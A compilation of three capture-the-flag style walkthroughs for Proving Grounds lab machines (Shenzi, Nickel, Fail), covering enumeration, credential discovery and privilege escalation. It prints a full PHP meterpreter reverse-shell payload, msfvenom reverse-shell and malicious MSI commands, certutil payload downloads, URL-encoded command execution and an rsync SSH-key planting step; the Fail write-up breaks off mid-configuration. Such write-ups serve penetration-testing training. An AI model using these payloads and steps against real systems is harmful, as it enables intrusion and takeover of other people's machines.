# Shenzi - Guess dir name in web server
```

Exploitation Guide for Shenzi
Summary

Discovering exposed credentials on an open SMB file share, we'll upload a PHP reverse shell to this target to gain an initial foothold. We'll then exploit an insecure registry configuration to install .msi packages as an elevated user.
Enumeration
Nmap

We'll start off with an nmap scan against all TCP ports.

kali@kali~# sudo nmap -p- 192.168.65.55
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 23:18 EST
Nmap scan report for 192.168.65.55
Host is up (0.070s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
5040/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 135.45 seconds

The main services of interest here are an FTP server, a web server, and an SMB server.
FTP Enumeration

Anonymous FTP access seems to be disabled.

kali@kali~# ftp 192.168.65.55
Connected to 192.168.65.55.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.65.55:kali): Anonymous
331 Password required for anonymous
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> 

SMB Enumeration

We do, however, find a Shenzi file share on the SMB server.

kali@kali~# smbclient -L \\\\192.168.65.55
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
SMB1 disabled -- no workgroup available

HTTP Enumeration

Navigating to http://192.168.65.55, we are presented with a default XAMPP dashboard. We can attempt to navigate to the phpMyAdmin page, but it is only accessible on the local network, and the PHP version info does not reveal anything of use to us.
Exploitation
Open Network Share

Since we can anonymously list SMB shares, perhaps there's a chance we can access a share anonymously as well. Let's try to enumerate the Shenzi share.

kali@kali~# smbclient \\\\192.168.65.55\\shenzi
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 28 11:45:09 2020
  ..                                  D        0  Thu May 28 11:45:09 2020
  passwords.txt                       A      894  Thu May 28 11:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 11:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 11:45:09 2020
  why.tmp                             A      213  Thu May 28 11:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 11:45:09 2020

                12941823 blocks of size 4096. 7642274 blocks available

We are able to connect to the share and list its contents. The passwords.txt file looks promising. Let's download it to our local machine.

smb: \> get passwords.txt
getting file \passwords.txt of size 894 as passwords.txt (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
smb: \> exit

The file contains what appears to be a username and a password for a Wordpress site.

kali@kali~# cat passwords.txt
### XAMPP Default Passwords ###

...

LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357

Remote Code Execution

More than likely, the referenced Wordpress site is being hosted on this machine. Common wordlist attacks against the web server fail to locate the Wordpress directory. However, since the share name is shenzi, let's try that. If we navigate to http://192.168.65.55/shenzi, we are indeed presented with a Wordpress site.

By default, the Wordpress admin login page is wp-login.php. Navigating there, we find it, enter the credentials and are granted access to the administration portal.

From here, we'll navigate to Appearance -> Theme Editor -> Theme Twenty Twenty to determine the active website theme. If we select a .php page (such as 404.php) we discover that we can directly edit the page's source code.

We can use this ability to execute arbitrary PHP code, including a reverse shell. Let's generate a PHP meterpreter payload with msfvenom.

kali@kali~# msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.49.65 lport=443 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes
/*<?php /**/ error_reporting(0); $ip = '192.168.49.65'; $port = 443; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();

We'll paste the code into the theme editor for the 404.php page, and click Update File.

Before executing the payload, we'll set up our meterpreter exploit/multi/handler module to catch the reverse shell.

kali@kali~# sudo msfconsole

...

msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.49.65
LHOST => 192.168.49.65
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.65:443

Once the file is updated, and our handler is running, we can navigate to the file to trigger our reverse shell.

Our PHP payload is executed on the server, and a meterpreter session is activated in our exploit handler.

[*] Sending stage (38288 bytes) to 192.168.65.55
[*] Meterpreter session 1 opened (192.168.49.65:443 -> 192.168.65.55:49807) at 2020-12-22 00:23:55 -0500

meterpreter > getuid
Server username: shenzi (0)
meterpreter >

Upgrading PHP Shell

Since PHP reverse shells are somewhat unstable, let's upload a more stable shell, which we'll generate with msfvenom.

kali@kali~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.65 LPORT=139 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

Let's set up a Netcat listener on port 139.

kali@kali~# sudo nc -lvp 139
listening on [any] 139 ...

Next, we can upload and execute the more-stable shell using our meterpreter connection.

meterpreter > upload shell.exe
[*] uploading  : shell.exe -> shell.exe
[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): shell.exe -> shell.exe
[*] uploaded   : shell.exe -> shell.exe
meterpreter > execute -f shell.exe
Process 6060 created.
meterpreter >

We should receive the shell in our Netcat listener.

kali@kali~# sudo nc -lvp 139
listening on [any] 139 ...
192.168.65.55: inverse host lookup failed: Unknown host
connect to [192.168.49.65] from (UNKNOWN) [192.168.65.55] 49808
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\shenzi>whoami
whoami
shenzi\shenzi

C:\xampp\htdocs\shenzi>

Escalation
Local Enumeration

We can use tools such as PowerUp or JAWS to try to find some low-hanging fruit in the system's configuration. These tools reveal a policy that will install MSI packages as SYSTEM.

C:\xampp\htdocs\shenzi>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\xampp\htdocs\shenzi>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\xampp\htdocs\shenzi>

AlwaysInstallElevated MSI Abuse

We can abuse this and escalate our privileges on the target by generating a malicious MSI package that will give us a reverse shell as the NT AUTHORITY\SYSTEM user.

To do this, we'll first generate an MSI package using msfvenom.

kali@kali~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.65 LPORT=445 -f msi > notavirus.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes

We can use our still-active meterpreter shell to upload the MSI package to the target.

meterpreter > upload notavirus.msi
[*] uploading  : notavirus.msi -> notavirus.msi
[*] Uploaded -1.00 B of 156.00 KiB (-0.0%): notavirus.msi -> notavirus.msi
[*] uploaded   : notavirus.msi -> notavirus.msi
meterpreter > 

Let's run another Netcat listener to catch our reverse shell.

kali@kali~# sudo nc -lvp 445  
listening on [any] 445 ...

Finally, we can install our malicious MSI package on the target using msiexec.

C:\xampp\htdocs\shenzi>msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"
msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"

C:\xampp\htdocs\shenzi>

Once we've done this, our listener indicates that we have received a reverse shell with NT AUTHORITY\SYSTEM level privileges.

kali@kali~# sudo nc -lvp 445  
listening on [any] 445 ...
192.168.65.55: inverse host lookup failed: Unknown host
connect to [192.168.49.65] from (UNKNOWN) [192.168.65.55] 49815
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

# Nickel
```
Nickel is rated by the Proving Grounds community as “very hard”. It also listed as one of the best boxes to [practice on for the OSCP certification](https://defaultcredentials.com/ctf/proving-grounds/oscp-like-boxes-on-proving-grounds/). We start as always, with our nmap.

We start with NMAP.

```
sudo nmap -sC -sV -p- 192.168.79.99
```

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-126.png)

FileZilla is not accepting anonymous FTP login.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-118.png)

SSH on port 21 and RDP on 3389 are rarely the initial entry points, but something we can keep in mind if come across some credentials.

Open a web browser and navigate to ports 8089 and 3333, for our HTTP servers. Port 8089 seems to be some type of dev environment.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-120.png)

Clicking a button redirects to another IP which is interesting, but also on port 33333, which is our other server.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-122.png)

Start Nikto;

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-124.png)

Let’s try and curl these pages as that can often reveal interesting information we can throw into Burpsuite.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-130.png)

The error is interesting; “Cannot GET”. I have had success on occasion changing the request type to POST.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-128.png)

It requires a Content Length, which we can specify with the following;

```
curl -d "" -X POST http://192.168.79.99:33333/list-running-procs
```

Success! We get a list back of the running processes. The most interesting to us is an entry with what appears to be hard-coded credentials using the SSH protocol. SSH was on our NMAP so we are likely getting close.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-132.png)

The password looks Base64 encoded. So let’s decode in Kali.

```
echo -n Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 –decode 
```

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-134.png)

We use these new credentials to log into an SSH shell;

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-94.png)

My first commands I use when getting a Windows shell are below. Enumerate OS etc, check for JuicyPotato, common password locations and running netstat.

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
whoami /priv
netstat –nao
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM
```

Of note with the netstat command is port 80, which was not available on our original nmap scan.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-96.png)

Let’s hunt around user folders. We don’t find anything in Ariah’s download folder, documents or desktop (except the user flag). In the root of C:\ we see the folder FTP.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-98.png)

Let’s download this file to our Kali box using SCP. Start a SSH server if it is not already running

```
systemctl start ssh.socket 
```

Transfer the file;

```
scp ariah@192.168.79.99:C:/ftp/Infrastructure.pdf . 
```

The .pdf file is password-protected, and although we can use John to crack the file, I prefer a tool called PDFCrack. Let’s see if it is in the Kali repository and install it.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-88.png)

PDFCrack simply needs the -f and -w switches for the file and the word-list location.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-90.png)

Password “ariah4168” is recovered. Let’s open the file.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-92.png)

This is very new and interesting information to us. The document references some webservers which were not in our initial scan. It also mentioned a command endpoint.

We already know port 80 is running on this machine so the information in this document might be our next path forward.

Let’s try and use the command endpoint.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-100.png)

This is a good sign. The aim now is to get a reverse shell onto this machine and abuse this to run it, as the shell will come back as SYSTEM. Let’s create the shell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.79 LPORT=80 -f exe > shell.exe
```

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-102.png)

Start a webserver.

```
sudo python3 –m http.server 80
```

Use certutil from ariah’s SSH shell to download the shell.

```
certutil.exe -urlcache -split -f "http://192.168.49.79/shell.exe" 
```

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-106.png)

Kill the HTTP Server and start netcat on port 80, as that is what we created our shell.exe with.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-108.png)

Back to Ariah’s SSH shell, let’s use the curl command to try and find our shell.exe before we run it. Just to make sure our syntax is correct.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-110.png)

I don’t get the expected results. We need to url encode this command. Find any website to do this.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-112.png)

Re run and we get the expected results.

```
curl http://localhost/?cmd%20%2Fc%20dir%20c%3A%5Cusers%5Cariah%5C
```

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-114.png)

Run the file with an updated encoded URL which will execute shell.exe

```
curl http://localhost/?cmd%20%2Fc%20dir%20c%3A%5Cusers%5Cariah%5C
```

And our shell comes back as system.

![](https://defcreds.b-cdn.net/wp-content/uploads/2021/05/image-116.png)

Definitely an interesting one! I hope you enjoyed.
```

# Fail
```
Offensive Security released the Linux machine Fail on January 28th 2021. The machine is rated intermediate by OffSec and hard by the community. I felt the box was more towards the easy end of intermediate. The machine requires a bit of knowledge using ssh keys for authentication and an application called fail2ban.

For those unfamiliar with fail2ban, I highly recommend checking it out [https://www.fail2ban.org/](https://www.fail2ban.org/) or [https://github.com/fail2ban/fail2ban](https://github.com/fail2ban/fail2ban).

1

                     __      _ _ ___ _               

2

                    / _|__ _(_) |_  ) |__  __ _ _ _  

3

                   |  _/ _` | | |/ /| '_ \/ _` | ' \ 

4

                   |_| \__,_|_|_/___|_.__/\__,_|_||_|

5

                   v1.0.1.dev1            20??/??/??

To start, we kick off [autorecon](https://github.com/Tib3rius/AutoRecon) on the target. Looking at the full scan.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans$ cat _full_tcp_nmap.txt 

2

# Nmap 7.91 scan initiated Sat Jan 30 20:50:32 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/kali/oscp/offsec/fail/results/192.168.116.126/scans/_full_tcp_nmap.txt -oX /home/kali/oscp/offsec/fail/results/192.168.116.126/scans/xml/_full_tcp_nmap.xml 192.168.116.126

3

Nmap scan report for 192.168.116.126

4

Host is up, received user-set (0.085s latency).

5

Scanned at 2021-01-30 20:50:33 EST for 98s

6

Not shown: 65533 closed ports

7

Reason: 65533 conn-refused

8

PORT    STATE SERVICE REASON  VERSION

9

22/tcp  open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

10

| ssh-hostkey: 

11

|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)

12

| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r

13

|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)

14

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=

15

|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)

16

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+

17

873/tcp open  rsync   syn-ack (protocol version 31)

18

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

19

​

20

Read data files from: /usr/bin/../share/nmap

21

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

22

# Nmap done at Sat Jan 30 20:52:12 2021 -- 1 IP address (1 host up) scanned in 99.59 seconds

Based on the nmap, we know for sure we will be looking further into rsync. For that we will be using additional rsync enumeration using netcat.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans$ nc -vn 192.168.116.126 873

2

(UNKNOWN) [192.168.116.126] 873 (rsync) open

3

@RSYNCD: 31.0

4

@RSYNCD: 31.0

5

#list

6

fox             fox home

7

@RSYNCD: EXIT

With netcat we can list out the current shares hosted with rsync. We see “fox” and “fox home”.

Using rsync we can list out the contents of the “fox” share with the -av –list-only options.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans$ rsync -av --list-only rsync://192.168.116.126/fox

2

receiving incremental file list

3

drwxr-xr-x          4,096 2021/01/21 09:21:59 .

4

lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null

5

-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout

6

-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc

7

-rw-r--r--            807 2019/04/18 00:12:36 .profile

8

​

9

sent 20 bytes  received 136 bytes  104.00 bytes/sec

10

total size is 4,562  speedup is 29.24

We see what looks like a user directory for the user fox. Lets pull down the files and take a look. Again we use the rsync command with the -av options and choose a target location.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans$ rsync -av rsync://192.168.116.126/fox ./rsyncfiles

2

receiving incremental file list

3

created directory ./rsyncfiles

4

./

5

.bash_history -> /dev/null

6

.bash_logout

7

.bashrc

8

.profile

9

​

10

sent 87 bytes  received 4,828 bytes  3,276.67 bytes/sec

11

total size is 4,562  speedup is 0.93

12

​

Bash history is useless since its linked to /dev/null. The other files also didn’t contain any useful information. At this point I found a method that could allow us to upload files using rsync. With that in mind, lets try and create key pair and see if we can SSH into the machine.

First, generate the private and public keys needed using the ed25519 algorithm.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans/rsyncfiles$ ssh-keygen -f ./authorized_keys -t ed25519

2

Generating public/private ed25519 key pair.

3

./authorized_keys already exists.

4

Overwrite (y/n)? y

5

Enter passphrase (empty for no passphrase): 

6

Enter same passphrase again: 

7

Your identification has been saved in ./authorized_keys

8

Your public key has been saved in ./authorized_keys.pub

9

The key fingerprint is:

10

SHA256:/MIJT869s7XwydKXAruLzaxQ/bEzjZP2y2NTqbMMFd4 kali@kali

11

The key's randomart image is:

12

+--[ED25519 256]--+

13

|                 |

14

|                 |

15

|             .   |

16

|       . .  . o  |

17

|      . S . .o E.|

18

|       O +...* ..|

19

|      . B +=@ oo |

20

|       . *+B=@*  |

21

|        o.O*=**+ |

22

+----[SHA256]-----+

Upload the .ssh folder containing the authorized_keys file with the public key contents.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans/rsyncfiles$ rsync -a --relativ

2

e ./.ssh  rsync://192.168.116.126/fox/

If you receive the stout below, just chmod 600 the private key file.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans/rsyncfiles$ ssh -i authorized_keys fox@192.168.116.126

2

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

3

@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @

4

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

5

Permissions 0766 for 'authorized_keys' are too open.

6

It is required that your private key files are NOT accessible by others.

7

This private key will be ignored.

8

Load key "authorized_keys": bad permissions

Now lets try and SSH into the target.

1

kali@kali:~/oscp/offsec/fail/results/192.168.116.126/scans/rsyncfiles$ sudo ssh -i authorized_keys fox@192.168.116.126

2

[sudo] password for kali: 

3

The authenticity of host '192.168.116.126 (192.168.116.126)' can't be established.

4

ECDSA key fingerprint is SHA256:TV71PEPS7AhnnK8K5GqGJm91acGTn5mr9GcVYS7rE1A.

5

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

6

Warning: Permanently added '192.168.116.126' (ECDSA) to the list of known hosts.

7

Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

8

​

9

The programs included with the Debian GNU/Linux system are free software;

10

the exact distribution terms for each program are described in the

11

individual files in /usr/share/doc/*/copyright.

12

​

13

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

14

permitted by applicable law.

15

$ whoami

16

fox

Easy enough. We are the user fox so we should be able to grab the user flag.

1

$ cd /home

2

$ ls

3

fox  local.txt

4

$ cat local.txt

5

bddfa9ab954461a691f9ec0d42153963

After grabbing the flag I immediately checked to see if the machine had wget. Luckily it does, so we can pull down the lse.sh enumeration script. First, start the http server.

1

kali@kali:~/tools/privesc/linux/linux-smart-enumeration$ sudo python3 -m http.server 80

2

[sudo] password for kali: 

3

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..

Next, wget the lse.sh script.

1

$ wget http://192.168.49.116/lse.sh

2

--2021-01-30 22:17:16--  http://192.168.49.116/lse.sh

3

Connecting to 192.168.49.116:80... connected.

4

HTTP request sent, awaiting response... 200 OK

5

Length: 40579 (40K) [text/x-sh]

6

Saving to: 'lse.sh'

7

​

8

lse.sh                 100%[=========================>]  39.63K  --.-KB/s    in 0.1s    

9

​

10

2021-01-30 22:17:16 (294 KB/s) - 'lse.sh' saved [40579/40579]

Change the permissions on the file to add execution permissions. Kick off the script using the level 1 enumeration.

1

$ ./lse.sh -l 1                                                                          

2

---                                                                                      

3

If you know the current user password, write it here to check sudo privileges:           

4

---                                                                                      

5

6

 LSE Version: 3.0                                                                        

7

8

        User: fox                                                                        

9

     User ID: 1000                                                                       

10

    Password: none                                                                       

11

        Home: /home/fox                                                                  

12

        Path: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

13

       umask: 0022

14

​

15

    Hostname: fail

16

       Linux: 4.19.0-12-amd64

17

Distribution: Debian GNU/Linux 10 (buster)

18

Architecture: x86_64

19

​

20

==================================================================( users )=====

21

[i] usr000 Current user groups.....................

The most interesting findings from the script was the writable files.

1

[*] fst000 Writable files outside user's home.............................. yes!

2

---

3

/tmp

4

/tmp/.font-unix

5

/tmp/tmp.sDorRq0S7Y

6

/tmp/.ICE-unix

7

/tmp/.Test-unix

8

/tmp/.XIM-unix

9

/tmp/tmp.CiZdjq2Cpj

10

/tmp/tmp.TZ9iMUd8jg

11

/tmp/.X11-unix

12

/tmp/tmp.3KFohtNxgi

13

/run/vmware/guestServicePipe

14

/run/dbus/system_bus_socket

15

/run/user/1000

16

/run/user/1000/systemd 

17

/run/user/1000/systemd/private

18

/run/user/1000/systemd/notify

19

/run/systemd/journal/dev-log

20

/run/systemd/journal/socket

21

/run/systemd/journal/stdout

22

/run/systemd/journal/syslog

23

/run/systemd/private

24

/run/systemd/notify

25

/run/lock

26

/home/local.txt

27

/var/tmp

28

/etc/fail2ban/action.d 

29

/etc/fail2ban/action.d/firewallcmd-ipset.conf

30

/etc/fail2ban/action.d/nftables-multiport.conf

31

/etc/fail2ban/action.d/firewallcmd-multiport.conf

32

/etc/fail2ban/action.d/mail-whois.conf

33

/etc/fail2ban/action.d/ufw.conf

34

/etc/fail2ban/action.d/sendmail-common.conf

35

/etc/fail2ban/action.d/hostsdeny.conf

36

/etc/fail2ban/action.d/iptables-common.conf

37

/etc/fail2ban/action.d/iptables.conf

38

/etc/fail2ban/action.d/iptables-ipset-proto4.conf

39

/etc/fail2ban/action.d/shorewall.conf

40

/etc/fail2ban/action.d/shorewall-ipset-proto6.conf

41

/etc/fail2ban/action.d/sendmail-buffered.conf

42

/etc/fail2ban/action.d/abuseipdb.conf

43

/etc/fail2ban/action.d/sendmail-whois-ipmatches.conf

44

/etc/fail2ban/action.d/mail.conf

45

/etc/fail2ban/action.d/sendmail-whois-ipjailmatches.conf

46

/etc/fail2ban/action.d/nftables-allports.conf

47

/etc/fail2ban/action.d/npf.conf                                                [366/1858]

48

/etc/fail2ban/action.d/apf.conf

49

/etc/fail2ban/action.d/badips.conf

50

/etc/fail2ban/action.d/iptables-multiport-log.conf

51

/etc/fail2ban/action.d/cloudflare.conf

52

/etc/fail2ban/action.d/sendmail-geoip-lines.conf

53

/etc/fail2ban/action.d/ipfilter.conf

54

/etc/fail2ban/action.d/xarf-login-attack.conf

55

/etc/fail2ban/action.d/sendmail-whois.conf

56

/etc/fail2ban/action.d/osx-ipfw.conf

57

/etc/fail2ban/action.d/route.conf

58

/etc/fail2ban/action.d/mail-buffered.conf

59

/etc/fail2ban/action.d/firewallcmd-common.conf

60

/etc/fail2ban/action.d/iptables-xt_recent-echo.conf

61

/etc/fail2ban/action.d/firewallcmd-rich-rules.conf

62

/etc/fail2ban/action.d/iptables-multiport.conf

63

/etc/fail2ban/action.d/firewallcmd-allports.conf

64

/etc/fail2ban/action.d/iptables-ipset-proto6.conf

65

/etc/fail2ban/action.d/sendmail-whois-lines.conf

66

/etc/fail2ban/action.d/iptables-allports.conf

67

/etc/fail2ban/action.d/badips.py

68

/etc/fail2ban/action.d/complain.conf

69

/etc/fail2ban/action.d/netscaler.conf

70

/etc/fail2ban/action.d/sendmail-whois-matches.conf

71

/etc/fail2ban/action.d/dummy.conf

72

/etc/fail2ban/action.d/sendmail.conf

73

/etc/fail2ban/action.d/nsupdate.conf

74

/etc/fail2ban/action.d/firewallcmd-rich-logging.conf

75

/etc/fail2ban/action.d/pf.conf

76

/etc/fail2ban/action.d/helpers-common.conf

77

/etc/fail2ban/action.d/nginx-block-map.conf

78

/etc/fail2ban/action.d/smtp.py

79

/etc/fail2ban/action.d/mail-whois-common.conf

80

/etc/fail2ban/action.d/dshield.conf

81

/etc/fail2ban/action.d/nftables-common.conf

82

/etc/fail2ban/action.d/mynetwatchman.conf

83

/etc/fail2ban/action.d/blocklist_de.conf

84

/etc/fail2ban/action.d/bsd-ipfw.conf

85

/etc/fail2ban/action.d/iptables-ipset-proto6-allports.conf

86

/etc/fail2ban/action.d/ipfw.conf

87

/etc/fail2ban/action.d/symbiosis-blacklist-allports.conf

88

/etc/fail2ban/action.d/mail-whois-lines.conf 

89

/etc/fail2ban/action.d/osx-afctl.conf

90

/etc/fail2ban/action.d/firewallcmd-new.conf

91

/etc/fail2ban/action.d/iptables-new.conf

We see the ability to write to all of the action.d files for fail2ban. Lets see if fail2ban is running as root.

1

[*] pro020 Processes running with root permissions......................... yes!

2

---

3

START      PID     USER COMMAND

4

22:20    24306     root /usr/bin/python3 /usr/bin/fail2ban-server -xf start

5

22:20    24060     root /usr/bin/python3 /usr/bin/fail2ban-client stop

6

22:20    24058     root /usr/bin/systemctl restart fail2ban

7

22:20    24056     root /bin/sh -c /usr/bin/systemctl restart fail2ban

8

22:20    24055     root /usr/sbin/CRON -f

9

22:19     1886     root /lib/systemd/systemd-udevd

10

22:19     1174     root /usr/bin/python3 /usr/bin/fail2ban-server -xf start

11

21:56      447     root /usr/sbin/inetutils-inetd

12

21:56      444     root /usr/sbin/sshd -D

13

21:56      442     root /sbin/agetty -o -p -- \u --noclear tty1 linux

14

21:56      422     root /usr/sbin/rsyslogd -n -iNONE

15

21:56      421     root /usr/bin/rsync --daemon --no-detach

16

21:56      419     root /usr/sbin/cron -f

17

21:56      417     root /lib/systemd/systemd-logind

18

21:56      411     root /usr/bin/vmtoolsd

19

21:56      410     root /usr/bin/VGAuthService

20

21:56      264     root /lib/systemd/systemd-udevd

21

21:56      246     root /lib/systemd/systemd-journald

22

21:56        1     root /sbin/init

Since fail to ban is running as root we have a decent shot at having fail2ban run a custom action based on the configuration located in action.d. First, lets check the configuration of the jail.conf.

1

# Action shortcuts. To be used to define action parameter

2

​

3

# Default banning action (e.g. iptables, iptables-new,

4

# iptables-multiport, shorewall, etc) It is used to define

5

# action_* variables. Can be overridden globally or per

6

# section within jail.local file

7

banaction = iptables-multiport

8

banaction_allports = iptables-allports

9

​

10

# The simplest action to take: ban only

